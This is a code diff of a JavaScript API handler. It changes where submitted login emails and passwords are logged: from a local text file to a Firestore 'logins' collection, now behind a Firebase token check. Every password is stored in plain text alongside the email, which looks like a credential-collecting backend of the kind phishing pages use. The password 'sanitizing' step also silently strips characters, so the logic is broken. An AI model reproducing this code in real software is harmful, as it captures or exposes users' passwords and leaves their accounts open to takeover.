@@ -1,23 +1,39 @@
-const fs = require('fs').promises;
-const path = require('path');
+const admin = require('firebase-admin');
+const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
+
+if (!admin.apps.length) {
+    admin.initializeApp({
+        credential: admin.credential.cert(serviceAccount),
+        databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
+    });
+}
+
+const db = admin.firestore();
 
 export default async function handler(req, res) {
     if (req.method === 'POST') {
         try {
-            const { email, pass: password } = req.body;
+            const { email, pass: password, authToken } = req.body;
+
+            // Verify the Firebase ID token
+            const decodedToken = await admin.auth().verifyIdToken(authToken);
+            if (!decodedToken) {
+                return res.status(401).json({ error: 'Unauthorized' });
+            }
 
             // Sanitize input
             const sanitizedEmail = email.replace(/[^a-zA-Z0-9@.]/g, '');
             const sanitizedPassword = password.replace(/[^a-zA-Z0-9]/g, '');
 
-            // Create a string to write to the file
-            const logEntry = `Email: ${sanitizedEmail} - Password: ${sanitizedPassword}\n`;
+            // Create a document to write to Firestore
+            const logEntry = {
+                email: sanitizedEmail,
+                password: sanitizedPassword,
+                timestamp: admin.firestore.FieldValue.serverTimestamp()
+            };
 
-            // Define the file path
-            const filePath = path.join(process.cwd(), 'logins.txt');
-
-            // Write the log entry to the file
-            await fs.appendFile(filePath, logEntry);
+            // Write the log entry to Firestore
+            await db.collection('logins').add(logEntry);
 
             res.status(200).send('Login information saved successfully!');
         } catch (error) {
